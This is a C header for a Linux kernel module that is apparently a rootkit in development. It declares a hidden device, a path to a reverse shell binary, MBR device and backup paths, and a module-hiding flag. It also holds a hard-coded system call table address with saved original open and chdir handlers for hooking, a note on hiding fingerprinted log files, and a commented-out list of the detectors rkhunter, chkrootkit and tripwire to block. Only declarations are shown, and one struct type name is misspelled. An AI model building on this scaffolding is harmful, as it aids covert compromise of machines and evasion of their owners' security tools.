#ifndef _ktest_H_
#define _ktest_H_

/* include headers */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/time.h>
//#include <linux/jiffies.h>
#include <linux/time.h>
#include <linux/timer.h>
#include <linux/moduleparam.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/semaphore.h>
#include <linux/kmod.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <asm/current.h>
#include <linux/buffer_head.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>


#define DEVICE_NAME ".ktest"
#define DEVICE_MAJOR 85
#define MAX_CMD_LENGTH 20
#define SHELL "/home/hook/Projects/lkm/syscall/shells/revshell"
#define MBR_DEVICE "/dev/sda"
#define MBR_BACKUP "/home/kexin/hook/Projects/lkm/data/mbr_backup"

/* module variables */
struct semaphore s;
static struct list_head *modList;
static struct tast_struck *thread1;
char commands[MAX_CMD_LENGTH];
int modHidden = 0;

int open_counter = 0;

/* references to new sys_call_table methods */
unsigned long *kt_sys_call_table = (unsigned long *) 0xffffffff00000000;

/* references to original sys_call_table methods */
asmlinkage long (*open_asli)(const char __user *filename,int flags, int mode);
asmlinkage long (*chdir_asli)(const char __user *filename);

/* references to dev I/O methods
static int dev_open(struct inode *,struct file *);
static int dev_release(struct inode *,struct file *);
ssize_t dev_read(struct file *,char *, size_t ,loff_t *);
ssize_t dev_write(struct file *,const char *,size_t ,loff_t *);
 */

/* log file names must contains fingerprint string in order to get hidden */

/* 
static char cmd_blocked[3][10] = {{"rkhunter"}, {"chkrootkit"}, {"tripwire"}};
*/

#endif

